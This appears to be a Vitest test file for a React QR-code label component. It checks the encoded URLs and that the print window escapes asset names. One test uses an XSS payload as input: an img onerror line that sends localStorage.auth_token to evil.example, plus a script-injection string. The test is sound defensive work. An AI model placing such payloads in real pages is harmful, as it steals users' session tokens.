import { beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import QRCode from 'qrcode'
import { AssetQRCode } from '../AssetQRCode'

vi.mock('qrcode', () => ({ default: { toCanvas: vi.fn(() => Promise.resolve()) } }))

describe('AssetQRCode', () => {
  beforeEach(() => vi.mocked(QRCode.toCanvas).mockClear())

  it('links the label to the public request form, by the random code', async () => {
    render(<AssetQRCode assetId={7} assetTag="FF-000007" publicCode="Ab3dEf" showActions={false} />)

    await waitFor(() => expect(QRCode.toCanvas).toHaveBeenCalled())
    const value = vi.mocked(QRCode.toCanvas).mock.calls[0][1]
    expect(value).toBe(`${window.location.origin}/request?asset=Ab3dEf`)
    expect(value).not.toContain('/assets/')
    expect(screen.getByText('Scan to report a problem')).toBeInTheDocument()
  })

  it('falls back to the asset page for an asset the server sent no code for', async () => {
    render(<AssetQRCode assetId={7} assetTag="FF-000007" showActions={false} />)

    await waitFor(() => expect(QRCode.toCanvas).toHaveBeenCalled())
    expect(vi.mocked(QRCode.toCanvas).mock.calls[0][1]).toBe(`${window.location.origin}/assets/7`)
    expect(screen.getByText('Scan to view asset')).toBeInTheDocument()
  })

  describe('the print window', () => {
    // The window is written as a string of HTML, which React does not escape: an asset's name is typed by a person.
    it('shows an asset name as text, never as markup that would run in the app\'s own address', async () => {
      const written: string[] = []
      vi.spyOn(HTMLCanvasElement.prototype, 'toDataURL').mockReturnValue('data:image/png;base64,AAAA')
      vi.spyOn(window, 'open').mockReturnValue({
        document: { write: (html: string) => written.push(html), close: vi.fn() },
        focus: vi.fn(),
        print: vi.fn(),
      } as unknown as Window)
      const evil = `<img src=x onerror="fetch('//evil.example/'+localStorage.auth_token)">`

      render(<AssetQRCode assetId={7} assetTag={`FF-7"><script>alert(1)</script>`} assetName={evil} publicCode="Ab3dEf" />)
      await waitFor(() => expect(QRCode.toCanvas).toHaveBeenCalled())
      await waitFor(() => expect(screen.getByRole('button', { name: /print/i })).toBeEnabled())
      await userEvent.click(screen.getByRole('button', { name: /print/i }))

      const html = written.join('')
      expect(html).toContain('&lt;img src=x onerror=')
      expect(html).not.toContain('<img src=x')
      expect(html).not.toContain('<script>')
      expect(html).toContain('FF-7&quot;&gt;&lt;script&gt;')
    })
  })
})
